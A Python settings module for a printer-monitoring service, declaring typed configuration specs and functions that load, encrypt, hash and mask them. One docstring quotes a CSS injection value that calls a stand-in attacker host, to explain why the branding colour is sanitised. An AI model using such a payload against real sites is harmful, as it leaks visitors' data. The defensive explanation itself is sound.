"""Operator-managed runtime settings.

Every setting is declared once in ``SPECS`` with a type, UI section, label, and a
default (seeded from env so existing deployments keep working). ``load_settings``
overlays DB ``app_settings`` rows on those defaults; the Settings page renders and
saves straight from the same specs. This is what lets all operational config live
in the UI while only DATABASE_URL + SECRET_KEY remain in the environment.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from sqlalchemy import select
from sqlalchemy.orm import Session

from central import models as m
from central.config import settings as _env

SECRET_PLACEHOLDER = "__keep__"  # form sends this when a secret is left unchanged

# The SCIM bearer token is persisted as a SHA-256 hash, not as an encrypted
# secret -- so it can't be decrypted back into a usable credential. The settings
# form hashes whatever the operator types (see save_settings) and masks the
# stored hash so it's never echoed back to the page (see masked_for_form).
SCIM_TOKEN_HASH_KEY = "scim.bearer_token_hash"


@dataclass
class Spec:
    key: str          # storage key, e.g. "smtp.host"
    type: str         # str | int | float | bool | secret
    section: str      # UI grouping
    label: str
    default: Any
    help: str = ""


SPECS: List[Spec] = [
    # Branding / white-label (Settings page auto-renders this section)
    Spec("app.name", "str", "Branding", "App name", "Printer Nanny",
         "Replaces 'Printer Nanny' in the nav, login page, and alert email subjects"),
    Spec("app.logo_url", "str", "Branding", "Logo URL", "",
         "External URL, or leave blank and upload one under SETTINGS → Branding below."
         " Falls back to the 🖨️ emoji."),
    Spec("app.public_url", "str", "Branding", "Public URL", "",
         "e.g. https://printers.msp.example.com. Used for the agent install command "
         "shown on /manage/agents — leave blank and the request URL is used."),
    Spec("app.primary_color", "str", "Branding", "Primary color", "#0f172a",
         "CSS color used for the top nav bar (e.g. #0f172a, rgb(15,23,42))"),
    Spec("app.support_email", "str", "Branding", "Support email", "",
         "Shown in the footer to all roles (especially client_readonly)"),
    Spec("app.footer_text", "str", "Branding", "Footer text", "",
         "Optional line of text shown in the footer alongside the support email"),
    # Email (SMTP)
    Spec("email.enabled", "bool", "Email (SMTP)", "Send email on alerts", False),
    Spec("email.default_recipients", "str", "Email (SMTP)", "Alert recipients",
         "", "Comma-separated addresses that receive alert emails"),
    Spec("smtp.host", "str", "Email (SMTP)", "SMTP host", _env.smtp_host),
    Spec("smtp.port", "int", "Email (SMTP)", "SMTP port", _env.smtp_port),
    Spec("smtp.user", "str", "Email (SMTP)", "SMTP username", _env.smtp_user),
    Spec("smtp.password", "secret", "Email (SMTP)", "SMTP password", _env.smtp_password),
    Spec("smtp.from", "str", "Email (SMTP)", "From address", _env.smtp_from),
    Spec("smtp.use_tls", "bool", "Email (SMTP)", "Use STARTTLS", _env.smtp_use_tls),
    # OAuth SMTP (modern auth) — Gmail or Microsoft 365 via XOAUTH2. With
    # smtp.auth_type=basic, the smtp.password field is used. With oauth_google
    # or oauth_microsoft, the consent flow stores a refresh token and the
    # channel refreshes the access token on demand.
    Spec("smtp.auth_type", "str", "Email (SMTP)", "Auth type", "basic",
         "basic | oauth_google | oauth_microsoft. Run the consent flow under "
         "the Connect buttons below after switching to an OAuth provider."),
    Spec("smtp.oauth_client_id", "str", "Email (SMTP)", "OAuth client ID", "",
         "App registration / Cloud Console client ID for SMTP outbound"),
    Spec("smtp.oauth_client_secret", "secret", "Email (SMTP)", "OAuth client secret", ""),
    Spec("smtp.oauth_tenant_id", "str", "Email (SMTP)", "OAuth tenant (Microsoft only)", "common",
         "Use 'common' for multi-tenant, or your Entra tenant GUID"),
    Spec("smtp.oauth_refresh_token", "secret", "Email (SMTP)", "OAuth refresh token", "",
         "Persisted by the Connect flow — clear and reconnect if it stops working"),
    Spec("smtp.oauth_access_token", "secret", "Email (SMTP)", "OAuth access token (cached)", ""),
    Spec("smtp.oauth_access_token_expires_at", "int", "Email (SMTP)",
         "OAuth access token expiry (unix ts)", 0),
    # Microsoft Teams
    Spec("teams.enabled", "bool", "Microsoft Teams", "Post to a Teams channel on alerts", False),
    Spec("teams.webhook_url", "secret", "Microsoft Teams", "Incoming webhook URL", "",
         "From Teams: channel ... -> Connectors -> Incoming Webhook -> Configure"),
    # Slack
    Spec("slack.enabled", "bool", "Slack", "Post to a Slack channel on alerts", False),
    Spec("slack.webhook_url", "secret", "Slack", "Incoming webhook URL", "",
         "Add the 'Incoming Webhooks' Slack app, pick a channel, paste the URL here"),
    Spec("slack.min_severity", "str", "Slack", "Minimum severity",
         "info", "info | warning | critical -- skip messages below this severity"),
    # Generic webhook (PSA / PagerDuty / Zapier / etc.)
    Spec("webhook.enabled", "bool", "Webhook (generic)",
         "POST every alert to a custom URL", False),
    Spec("webhook.url", "str", "Webhook (generic)", "Webhook URL", "",
         "JSON POST destination. See docs for the payload shape."),
    Spec("webhook.auth_header", "str", "Webhook (generic)", "Auth header name",
         "Authorization", "Header name for the credential (e.g. X-Api-Key)"),
    Spec("webhook.auth_token", "secret", "Webhook (generic)", "Auth header value",
         "", "Sent verbatim -- e.g. 'Bearer abc123' or your raw token"),
    Spec("webhook.min_severity", "str", "Webhook (generic)", "Minimum severity",
         "info", "info | warning | critical -- skip messages below this severity"),
    # FreeScout (ticketing)
    Spec("freescout.enabled", "bool", "FreeScout", "Open a ticket on alerts", False),
    Spec("freescout.base_url", "str", "FreeScout", "Base URL", _env.freescout_base_url,
         "e.g. https://help.msp.example.com"),
    Spec("freescout.api_key", "secret", "FreeScout", "API key", _env.freescout_api_key,
         "From the API & Webhooks module"),
    Spec("freescout.mailbox_id", "int", "FreeScout", "Mailbox ID", _env.freescout_mailbox_id),
    # Scheduled reports (sent by the worker through the email channel)
    Spec("reports.weekly_enabled", "bool", "Reports", "Send a weekly fleet summary email", False),
    Spec("reports.weekly_day", "str", "Reports", "Weekly report day", "mon",
         "mon | tue | wed | thu | fri | sat | sun (UTC)"),
    Spec("reports.monthly_enabled", "bool", "Reports",
         "Send a monthly billing CSV (inventory + page counts)", False),
    Spec("reports.monthly_day", "int", "Reports", "Monthly report day of month", 1,
         "1-31 -- sent on the first worker cycle after the send hour that day. "
         "Clamped to the month's last day, so 31 still fires in February."),
    Spec("reports.send_hour", "int", "Reports", "Send hour (UTC, 0-23)", 7),
    Spec("reports.recipients", "str", "Reports", "Report recipients", "",
         "Comma-separated. Leave blank to use the alert email recipients."),
    # Alerts
    Spec("alerts.low_supply_pct", "float", "Alerts", "Low-supply threshold (%)", 20.0,
         "Default supply level that counts as 'low' in the dashboard"),
    Spec("alerts.reorder_lead_days", "int", "Alerts", "Reorder lead time (days)", 14,
         "Open a predicted-depletion alert when a supply is forecast to run out "
         "within this many days — set it to how long a replacement cartridge "
         "takes to arrive so you order before the printer goes dark"),
    Spec("alerts.offline_grace_seconds", "int", "Alerts", "Agent offline grace (seconds)",
         _env.agent_offline_grace_seconds, "Mark an agent offline after this long without a heartbeat"),
    Spec("alerts.printer_offline_minutes", "int", "Alerts", "Printer offline grace (minutes)", 30,
         "Mark a printer offline after this long with no reading. Keep it "
         "comfortably above the poll interval so one missed sweep doesn't flag "
         "a healthy device — printers behind an offline agent are skipped, so "
         "a site outage stays one alert instead of one per printer"),
    Spec("alerts.escalate_after_minutes", "int", "Alerts", "Re-notify after (minutes)", 0,
         "Re-send an alert that's still unresolved after this many minutes "
         "(bumps its escalation level). 0 disables escalation re-notifies."),
    Spec("alerts.supply_deadband_pct", "float", "Alerts", "Supply recovery margin (%)", 3.0,
         "A low-supply alert opens at the threshold but only clears once the "
         "level climbs this far ABOVE it. Stops a cartridge reading just either "
         "side of the threshold from resolving and re-alerting every cycle. "
         "0 disables the margin (clears the moment it's back over the line)."),
    Spec("alerts.occurrence_clear_margin_pct", "float", "Alerts",
         "Occurrence-rate recovery margin (%)", 25.0,
         "An occurrence-rate alert (“10 jams a day”) opens at its count "
         "and only clears once the count in the window falls this far BELOW it. "
         "Without a margin the alert resolves the moment one occurrence ages "
         "out of the rolling window and re-opens on the very next one — which "
         "is how flapping was invented. 0 disables the margin."),
    Spec("alerts.renotify_cooldown_min", "int", "Alerts", "Flap cooldown (minutes)", 30,
         "If a condition clears and re-fires within this window, re-open the "
         "original alert instead of raising a new one, and don't re-notify — "
         "one incident, one notification. Covers flapping that a supply margin "
         "can't, like an error code or a printer bouncing offline. 0 disables."),
    Spec("alerts.default_timezone", "str", "Alerts", "Default timezone", "UTC",
         "IANA zone name (e.g. America/New_York) used to interpret quiet hours "
         "for clients that haven't set their own. Quiet hours are wall-clock "
         "local — 'after 18:00' means the client's 18:00 — so this is the "
         "fallback when a client's timezone is blank. An unrecognised name "
         "falls back to UTC rather than failing."),
    Spec("alerts.max_error_alerts_per_printer", "int", "Alerts",
         "Max error alerts per printer", 5,
         "One alert per distinct error code, capped here so a misbehaving "
         "device can't open dozens at once. Codes beyond the cap are counted "
         "in the detail of the alerts that do open, never dropped silently."),
    # Supplies (reorder) — thresholds for the RECOMMEND-ONLY reorder surface
    # (central.reorder). These decide what appears on the reorder list, in the
    # portal panel and in the weekly report; they do not order anything, and
    # nothing in this product ever will. Three independent triggers, because
    # level alone is not enough: 20% of a cartridge is a fortnight on one device
    # and an afternoon on another. Defaults are calibrated against what the
    # incumbents do, cited per setting.
    Spec("reorder.level_pct", "float", "Supplies (reorder)",
         "Recommend at or below level (%)", 20.0,
         "Konica Minolta's automated supply dispatch triggers at 20% remaining. "
         "Set to 0 to switch the level trigger off and rely on the forecasts."),
    Spec("reorder.days_remaining", "int", "Supplies (reorder)",
         "…or at or below forecast days remaining", 21,
         "Xerox ASR orders at 2–3 weeks of usage remaining. Fires off the "
         "days-to-empty regression, so it accounts for how fast THIS device "
         "actually consumes. 0 switches the days trigger off."),
    Spec("reorder.pages_remaining", "int", "Supplies (reorder)",
         "…or at or below forecast pages remaining", 500,
         "Pages-remaining is stable where days-remaining is volatile: a quiet "
         "week inflates the days estimate but not the page one, and this number "
         "is directly comparable against the yield a cartridge is sold by. "
         "0 switches the pages trigger off."),
    Spec("reorder.urgent_level_pct", "float", "Supplies (reorder)",
         "Treat as 'order now' at or below level (%)", 5.0,
         "A cartridge this low is about to fail regardless of what the forecast "
         "says, so it is promoted out of 'order soon' even with no estimate. "
         "The other route to 'order now' is the reorder lead time above — a "
         "supply that will not outlast delivery is already late."),
    Spec("reorder.include_in_reports", "bool", "Supplies (reorder)",
         "Include the reorder list in the weekly fleet email", True,
         "Aggregated per client and per cartridge, so an MSP orders once rather "
         "than once per device."),
    # Outbound events. Default OFF: the recommendation surface works without an
    # event bus, and publishing a customer's fleet to an external system is an
    # opt-in decision, not a side effect of upgrading.
    Spec("reorder.emit_events", "bool", "Supplies (reorder)",
         "Publish supply.reorder_recommended events", False,
         "Sends one typed event per recommended cartridge to the outbound event "
         "bus so your ERP or PSA can act on it. Printer Nanny still places no "
         "orders and holds no order state — a human orders every cartridge."),
    Spec("reorder.emit_interval_min", "int", "Supplies (reorder)",
         "Minimum minutes between event publishes", 1440,
         "The worker cycles every 60s; a recommendation is a daily-grade "
         "decision, so publishing every cycle would be a firehose of the same "
         "facts. Each event carries a stable dedupe key regardless."),
    # ESG / Sustainability — turn page-count history into estimated print
    # footprint (paper, CO2e, energy, trees). Every factor is operator-tunable
    # so a customer can plug in their own paper stock / grid figures. Defaults
    # are defensible public estimates, cited in queries.sustainability_rollup;
    # all derived numbers are ESTIMATES and labelled as such in the UI.
    Spec("esg.sheets_per_page", "float", "ESG / Sustainability", "Sheets per printed page",
         0.85, "Page-count deltas are impressions; a portion print duplex, so "
         "fewer physical sheets than pages. <1.0 assumes some duplexing."),
    Spec("esg.paper_g_per_sheet", "float", "ESG / Sustainability", "Paper mass per sheet (g)",
         4.5, "One US-Letter sheet of 75 gsm office paper ~= 4.5 g."),
    Spec("esg.co2_g_per_sheet", "float", "ESG / Sustainability", "CO2e per sheet (g)",
         4.74, "Estimate ~4.7 g CO2e per A4/Letter sheet (lifecycle: pulp, "
         "manufacture, transport) — widely cited paper-footprint figure."),
    Spec("esg.kwh_per_page", "float", "ESG / Sustainability", "Energy per page (kWh)",
         0.0011, "Estimated office laser print energy per page (~1.1 Wh) "
         "including imaging/fusing — ENERGY STAR class device."),
    Spec("esg.sheets_per_tree", "float", "ESG / Sustainability", "Sheets per tree",
         8333.0, "~8,333 sheets of office paper per tree (one tree ~= 16.67 "
         "reams of 500) — common pulp-yield estimate."),
    # Notification delivery retry / dead-letter (see central.worker.jobs.retry_deliveries).
    # A failed channel send is persisted as a NotificationDelivery and retried by
    # the worker with exponential backoff; after this many attempts it is
    # dead-lettered instead of retried forever.
    Spec("notifications.max_attempts", "int", "Alerts", "Notification max delivery attempts", 5,
         "How many times to (re)try a failed alert send before dead-lettering it"),
    Spec("notifications.retry_base_seconds", "int", "Alerts", "Notification retry base backoff (seconds)",
         60, "First retry waits this long; each further attempt doubles it (capped at 1h)"),
    # Polling (pushed to agents)
    Spec("polling.poll_interval_seconds", "int", "Polling", "Poll interval (seconds)", 300),
    Spec("polling.discovery_interval_seconds", "int", "Polling", "Discovery interval (seconds)", 3600),
    Spec("polling.heartbeat_interval_seconds", "int", "Polling", "Heartbeat interval (seconds)", 60),
    # SNMP defaults (pushed to agents)
    Spec("snmp.community", "str", "SNMP defaults", "Community", "public"),
    Spec("snmp.version", "str", "SNMP defaults", "Version (1 / 2c)", "2c"),
    Spec("snmp.timeout", "float", "SNMP defaults", "Timeout (seconds)", 2.0),
    Spec("snmp.retries", "int", "SNMP defaults", "Retries", 1),
    # Data retention (central.retention -- rollup + opt-in prune of `readings`)
    Spec("retention.rollup_enabled", "bool", "Data retention",
         "Roll readings up into daily summaries", True,
         "Collapses raw readings older than the raw window below into one row per "
         "printer per UTC day — page/mono/colour meters plus end-of-day supply "
         "levels — kept forever. Non-destructive on its own: raw readings are only "
         "removed if you also switch on deletion below."),
    Spec("retention.raw_days", "int", "Data retention", "Keep raw readings for (days)", 90,
         "Readings older than this become eligible for rollup, and for deletion if "
         "that is enabled. Supply-runway forecasts read raw readings only, over a "
         "30-day window, so anything below 31 is refused and 31 used instead (the "
         "worker logs it) — a shorter window would starve every estimate without "
         "failing anywhere. Whole UTC days are rolled, so the window actually kept "
         "is this many days or up to 24h more, never less."),
    Spec("retention.delete_enabled", "bool", "Data retention",
         "Delete raw readings once they are rolled up", False,
         "DESTRUCTIVE AND IRREVERSIBLE — off by default. A raw reading is only ever "
         "deleted in the same database transaction that commits its daily rollup, so "
         "nothing can be removed that was not summarised first, and every pass that "
         "deletes is written to the audit log."),
    Spec("retention.max_batches_per_cycle", "int", "Data retention",
         "Retention batches per worker cycle", 200,
         "Caps how much retention work one cycle does. A batch is one day-scan or one "
         "printer-day rollup+delete transaction. The worker runs under a single-leader "
         "lock, so this is what stops a large backlog from stalling alerting — it "
         "drains over many cycles instead of one long statement."),
    # Single sign-on (OIDC)
    Spec("oidc.enabled", "bool", "Single sign-on (OIDC)", "Enable SSO login", False),
    Spec("oidc.issuer", "str", "Single sign-on (OIDC)", "Issuer / discovery URL", "",
         "e.g. https://login.microsoftonline.com/<tenant>/v2.0"),
    Spec("oidc.client_id", "str", "Single sign-on (OIDC)", "Client ID", ""),
    Spec("oidc.client_secret", "secret", "Single sign-on (OIDC)", "Client secret", ""),
    Spec("oidc.scopes", "str", "Single sign-on (OIDC)", "Scopes", "openid email profile"),
    Spec("oidc.button_label", "str", "Single sign-on (OIDC)", "Login button label", "Sign in with SSO"),
    Spec("oidc.auto_provision", "bool", "Single sign-on (OIDC)", "Auto-create users on first login", True),
    Spec("oidc.default_role", "str", "Single sign-on (OIDC)", "Role for new SSO users", "tech"),
    # SCIM 2.0 provisioning (RFC 7644). Lets an IdP (Entra ID / Okta / etc.)
    # create, update and -- critically -- DEPROVISION (deactivate) users
    # automatically. The bearer token is what the IdP sends on every SCIM call;
    # it's stored hashed (like an agent API key) and only ever shown once when
    # generated, so paste it into the IdP immediately. Disabled by default.
    Spec("scim.enabled", "bool", "SCIM provisioning", "Enable SCIM 2.0 user provisioning", False,
         "Exposes /scim/v2/Users for an IdP to provision & deprovision users"),
    # The IdP's bearer token is stored as a SHA-256 HASH (not the token, not a
    # reversible cipher) -- same treatment as agent API keys (central.security).
    # The settings form HASHES whatever the operator pastes before persisting,
    # so this row never holds a usable credential. Hence a plain ``str`` spec
    # (a digest is not itself a secret); ``scim.set_bearer_token`` does the
    # hashing and ``scim.token_matches`` the constant-time compare.
    Spec("scim.bearer_token_hash", "str", "SCIM provisioning", "SCIM bearer token", "",
         "The token your IdP sends as 'Authorization: Bearer <token>'. Stored "
         "hashed -- paste a long random string here, then configure the same "
         "value in your IdP's SCIM connector. Leave blank to keep the current one."),
    Spec("scim.default_role", "str", "SCIM provisioning", "Role for new SCIM users", "tech",
         "admin | tech | client_readonly -- role assigned to users the IdP creates"),
    # Agent install (used to build the one-line install command shown on the Agents page)
    Spec("agent.pip_source", "str", "Agent install", "pip install source",
         "git+https://github.com/stephenthecold/printer-nanny.git#subdirectory=agent",
         "Where install-agent.sh pip-installs the agent from — set to your repo after publishing"),
    Spec("agent.docker_image", "str", "Agent install", "Docker image",
         "ghcr.io/stephenthecold/printer-nanny-agent:latest",
         "Image used by the Docker install option"),
    # Source for the Python embeddable runtime bundled into the Windows MSI.
    # Leave blank to use the pinned python.org default; point at an internal
    # mirror, a file:// path, or a pre-staged zip in PN_CACHE_DIR for air-gapped
    # sites that can't reach python.org.
    Spec("agent.python_embed_url", "str", "Agent install", "Windows MSI: Python embeddable URL", "",
         "Where the MSI builder fetches the Python embeddable runtime. Blank = "
         "pinned python.org default. Use an internal mirror or file:// path for air-gapped sites."),
    # Onboarding defaults — what a newly onboarded client starts with, so a
    # fleet that appears is already monitored instead of merely visible.
    # Applied once at creation and then owned by the client: editing these
    # never reaches back and rewrites customers who were already set up, which
    # would silently overwrite whatever an operator tuned by hand.
    Spec("workstation.manage_default_printer", "bool", "Workstations",
         "Set the user's default printer", True,
         "Windows 10/11 ship with \"Let Windows manage my default printer\" ON, "
         "which switches the default to whatever was printed to last -- so an "
         "assigned default silently will not stick. With this on, the client "
         "turns that off for the signed-in user and then sets the assigned "
         "default, verifying it took. That overrides a user-facing Windows "
         "preference on their behalf; off means the client reports the desired "
         "default but changes nothing."),
    Spec("workstation.adopt_by_name", "bool", "Workstations",
         "Re-imaged PCs keep their printers", True,
         "A re-imaged PC has lost its identity file, so it enrolls as a stranger. "
         "With this on, an enrolling machine whose computer name matches exactly "
         "one RETIRED-looking record for that client takes that record over, "
         "keeping its printer assignments and settings. Off means a re-image is "
         "always a brand-new machine that comes back with nothing. Adoption is "
         "always tenant-scoped and always audited (machine.adopt)."),
    Spec("workstation.adopt_stale_after_min", "int", "Workstations",
         "Treat a machine as gone after (minutes)", 60,
         "Only a record not seen for this long can be taken over. A machine that "
         "checked in recently is ALIVE, so a name match is a collision rather than "
         "a re-image -- adopting it would steal a working PC's identity and the "
         "two would fight over it forever. Raise this if you re-image slowly; "
         "lower it only if you understand that trade."),
    Spec("workstation.allow_macos_pkg_install", "bool", "Workstations",
         "Let Macs install vendor .pkg drivers", False,
         "macOS has no pnputil, so a full vendor driver arrives as a .pkg. With "
         "this on, a Mac runs `installer -pkg` on a package you uploaded, as "
         "root. Off (the default) it binds PPDs only -- either a .ppd from your "
         "package, or one your MDM already installed -- and reports a .pkg "
         "package as a stated skip. This is deliberately a separate decision "
         "from who may upload: a .pkg runs arbitrary pre/postinstall scripts as "
         "root, which is a wider grant than the Windows path, so it is opted "
         "into rather than inherited. Uploads are audited with their digest "
         "either way."),
    Spec("onboarding.apply_defaults", "bool", "Onboarding defaults",
         "Apply defaults to new clients", True,
         "When a client is created through Onboard, give it the starting alert "
         "rule, quiet hours and maintenance interval below. Off means a new "
         "client starts with nothing client-specific and inherits only global rules."),
    Spec("onboarding.low_supply_pct", "int", "Onboarding defaults",
         "Low-supply alert threshold (%)", 15,
         "Creates a client-scoped low-supply rule at this level. 0 skips the rule "
         "entirely and leaves the client on whatever global rules exist."),
    Spec("onboarding.quiet_hours", "str", "Onboarding defaults",
         "Quiet hours (HH:MM-HH:MM)", "18:00-07:00",
         "Creates a client-scoped recurring quiet-hours window in the client's own "
         "timezone. Wrapping midnight is normal and expected. Blank creates none."),
    Spec("onboarding.quiet_hours_weekdays", "str", "Onboarding defaults",
         "Quiet hours weekdays", "0,1,2,3,4,5,6",
         "Comma-separated, Monday=0. The mask gates the day a window STARTS, so a "
         "Fri-night window still covers Saturday morning."),
    Spec("onboarding.maintenance_interval_days", "int", "Onboarding defaults",
         "Maintenance interval (days)", 0,
         "Creates a client-wide maintenance schedule at this interval for printers "
         "as they are approved. 0 (the default) creates none — most MSPs schedule "
         "maintenance per model rather than per customer."),
    # Directory sync cadence. The credentials themselves are per-client and
    # live on directory_connections, not here -- a global setting cannot hold
    # one tenant's client secret per customer.
    Spec("directory.sync_enabled", "bool", "Directory sync", "Run directory sync", True,
         "Master switch. Off leaves every configured connection untouched."),
    Spec("directory.sync_interval_min", "int", "Directory sync", "Sync every (minutes)", 60,
         "How often the worker refreshes each enabled connection. Directories change "
         "slowly; a short interval mostly buys API throttling."),
    # Outbound event bus. The destinations and their signing secrets live on
    # event_subscriptions, not here -- a global setting cannot hold one signing
    # key per partner, and a secret in this table is rendered on the Settings
    # page. These are the knobs that genuinely are install-wide.
    Spec("events.enabled", "bool", "Event bus", "Send outbound events", True,
         "Master switch. Off queues events without sending them; switching it "
         "back on delivers the backlog."),
    Spec("events.max_attempts", "int", "Event bus", "Max delivery attempts", 8,
         "A delivery that fails this many times is dead-lettered instead of "
         "retried forever. Backoff doubles each attempt, capped at an hour."),
    Spec("events.retry_base_seconds", "int", "Event bus", "Retry base (seconds)", 60,
         "First retry waits this long; each subsequent one doubles."),
    Spec("events.timeout_seconds", "int", "Event bus", "Request timeout (seconds)", 15,
         "A subscriber that does not answer in this long counts as a failed "
         "attempt and is retried."),
    Spec("events.retention_days", "int", "Event bus", "Keep delivered events for (days)", 30,
         "Fully-delivered events older than this are pruned. Events with a "
         "delivery still queued are always kept. 0 disables pruning."),
    Spec("events.allow_private_destinations", "bool", "Event bus",
         "Allow private / loopback destinations", False,
         "Off by default: a subscription URL makes this server issue requests, "
         "so an internal address is a way to probe your own network. Turn it on "
         "only if the subscriber really is on this LAN (e.g. "
         "http://helpdesk.lan:8080/hooks). Link-local and cloud-metadata "
         "addresses stay refused either way."),
]

SPEC_BY_KEY: Dict[str, Spec] = {s.key: s for s in SPECS}

# Settings-page sub-menus: group slug -> (tab label, [Spec.section names]).
# The page renders one group at a time; the save handler scopes its writes to
# the posted group's sections so an absent checkbox in another group is NOT
# misread as "unchecked" (bools outside the posted form must keep their value).
SETTINGS_GROUPS: "Dict[str, tuple]" = {
    "branding": ("Branding", ["Branding"]),
    "notifications": (
        "Notifications",
        ["Email (SMTP)", "Microsoft Teams", "Slack", "Webhook (generic)", "FreeScout",
         "Event bus"],
    ),
    "alerts": ("Alerts & Reports",
               ["Alerts", "Supplies (reorder)", "Reports", "ESG / Sustainability"]),
    # Retention lives here because it is the other half of polling: how often we
    # ask, and how long we keep what comes back.
    "polling": ("Polling & SNMP", ["Polling", "SNMP defaults", "Data retention"]),
    "auth": ("Authentication",
             ["Single sign-on (OIDC)", "SCIM provisioning", "Directory sync"]),
    "agents": ("Agents", ["Agent install", "Workstations", "Onboarding defaults"]),
}
DEFAULT_SETTINGS_GROUP = "branding"


def _coerce(spec: Spec, raw: Any) -> Any:
    if raw is None:
        return spec.default
    try:
        if spec.type == "int":
            return int(raw)
        if spec.type == "float":
            return float(raw)
        if spec.type == "bool":
            if isinstance(raw, bool):
                return raw
            return str(raw).lower() in ("1", "true", "on", "yes")
        return str(raw)
    except (TypeError, ValueError):
        return spec.default


def default_settings() -> Dict[str, Any]:
    return {s.key: s.default for s in SPECS}


def load_settings(db: Session) -> Dict[str, Any]:
    """Defaults overlaid with stored values (coerced to each spec's type).

    Secret-typed values are decrypted on the way out (central.secrets);
    legacy plaintext rows pass through unchanged, so a fleet upgraded
    mid-flight keeps working before its first re-save.
    """
    from central.secrets import decrypt_value

    merged = default_settings()
    for row in db.scalars(select(m.AppSetting)):
        spec = SPEC_BY_KEY.get(row.key)
        if spec is None or row.value is None:
            continue
        raw = decrypt_value(row.value) if spec.type == "secret" else row.value
        merged[row.key] = _coerce(spec, raw)
    return merged


def save_settings(
    db: Session, form: Dict[str, Any], sections: "Optional[set]" = None
) -> None:
    """Upsert settings from a settings-form submission or a partial update.

    ``sections`` declares which sections the payload covers, and is what makes
    an absent checkbox meaningful: an unchecked box is simply not submitted by
    the browser, so "in ``sections`` but not in ``form``" is the only way to
    record False. The grouped settings page passes the posted group's sections
    for exactly that reason.

    With ``sections=None`` the payload is a PARTIAL update (logo upload, OAuth
    token refresh, seed, tooling, tests): keys that aren't in it were never
    submitted, so bools are left alone just like every other type. Inferring
    "unchecked" there used to switch off STARTTLS, every channel, SSO and SCIM
    behind the operator's back -- credentials intact, so the UI still looked
    configured while alerting was dark. Callers that need a checkbox cleared
    must say which sections they are speaking for.

    Secret fields left as the placeholder keep their stored value. Secrets are
    encrypted at rest (central.secrets); every save also sweeps legacy
    plaintext secret rows into encrypted form -- the lazy half of the
    encryption migration.
    """
    from central.secrets import encrypt_value, is_encrypted

    from central.security import hash_api_key

    existing = {row.key: row for row in db.scalars(select(m.AppSetting))}
    partial = sections is None
    for spec in SPECS:
        if sections is not None and spec.section not in sections:
            continue
        absent = spec.key not in form
        if absent and (partial or spec.type != "bool"):
            continue  # not submitted → keep whatever is stored
        if spec.type == "bool":
            value: Any = not absent  # checkbox present → checked
        elif spec.key == SCIM_TOKEN_HASH_KEY:
            # The form posts the *plaintext* SCIM token. Hash it before storing;
            # the placeholder / empty string means "keep the current hash".
            raw = str(form[spec.key])
            if raw in (SECRET_PLACEHOLDER, ""):
                continue
            value = hash_api_key(raw)
        else:
            raw = form[spec.key]
            if spec.type == "secret" and raw in (SECRET_PLACEHOLDER, ""):
                continue  # leave the stored secret untouched
            value = _coerce(spec, raw)
            if spec.type == "secret":
                value = encrypt_value(str(value))
        row = existing.get(spec.key)
        if row is None:
            db.add(m.AppSetting(key=spec.key, value=value))
        else:
            row.value = value
    # Sweep: re-encrypt any secret row still holding plaintext (pre-upgrade
    # data, or rows written by code paths that predate encryption).
    for spec in SPECS:
        if spec.type != "secret":
            continue
        row = existing.get(spec.key)
        if row is not None and isinstance(row.value, str) and row.value \
                and not is_encrypted(row.value):
            row.value = encrypt_value(row.value)
    db.commit()


def encrypt_existing_settings(db: Session) -> int:
    """One-shot startup migration: encrypt every plaintext secret row.

    Idempotent (encrypted rows are skipped) and safe to race with the worker
    (load_settings handles both forms). Returns the number of rows updated
    so the caller can log it.
    """
    from central.secrets import encrypt_value, is_encrypted

    updated = 0
    for row in db.scalars(select(m.AppSetting)):
        spec = SPEC_BY_KEY.get(row.key)
        if spec is None or spec.type != "secret":
            continue
        if isinstance(row.value, str) and row.value and not is_encrypted(row.value):
            row.value = encrypt_value(row.value)
            updated += 1
    if updated:
        db.commit()
    return updated


def app_branding(db: Session) -> Dict[str, Any]:
    """White-label settings for templates: ``{"name", "logo_url", "primary_color", …}``.

    Single query per render so the nav, login page, and footer can stay
    operator-controlled without each template knowing about ``runtime``.

    ``primary_color`` is passed through ``safe_css_color`` on the way out.
    base.html interpolates it into a ``style`` attribute, where autoescaping
    stops an attribute breakout but not CSS itself -- ``red; background-image:
    url(https://attacker/?c=)`` stays inside the declaration and still calls
    out. Guarding at the sink covers values that predate the input validation,
    values put there by a direct DB edit, and any future writer.
    """
    from central.branding import safe_css_color

    full = load_settings(db)
    out = {
        key.split(".", 1)[1]: value
        for key, value in full.items()
        if key.startswith("app.")
    }
    out["primary_color"] = safe_css_color(out.get("primary_color"))
    return out


def masked_for_form(values: Dict[str, Any]) -> Dict[str, Any]:
    """Replace secret values with the placeholder so they aren't echoed to the page."""
    out = dict(values)
    for spec in SPECS:
        if spec.type == "secret" and out.get(spec.key):
            out[spec.key] = SECRET_PLACEHOLDER
    # The SCIM token is a non-secret-typed str (it holds a hash) but must never
    # be echoed back to the form either -- mask it the same way.
    if out.get(SCIM_TOKEN_HASH_KEY):
        out[SCIM_TOKEN_HASH_KEY] = SECRET_PLACEHOLDER
    return out


def set_scim_token(db: Session, token: str) -> None:
    """Persist the SHA-256 hash of a SCIM bearer token (helper for tooling/tests).

    Delegates to save_settings, which hashes the plaintext via the same
    ``hash_api_key`` path the IdP-facing auth check uses. Deliberately a
    partial update (no ``sections``): rotating the token must not touch
    ``scim.enabled``, which a scoped write would read as unchecked and switch
    off -- silently deprovisioning the IdP integration.
    """
    save_settings(db, {SCIM_TOKEN_HASH_KEY: token})


def scim_token_matches(db: Session, presented: str) -> bool:
    """Constant-time check of a presented bearer token against the stored hash."""
    import hmac

    from central.security import hash_api_key

    stored = str(load_settings(db).get(SCIM_TOKEN_HASH_KEY) or "")
    if not stored or not presented:
        return False
    return hmac.compare_digest(stored, hash_api_key(presented))
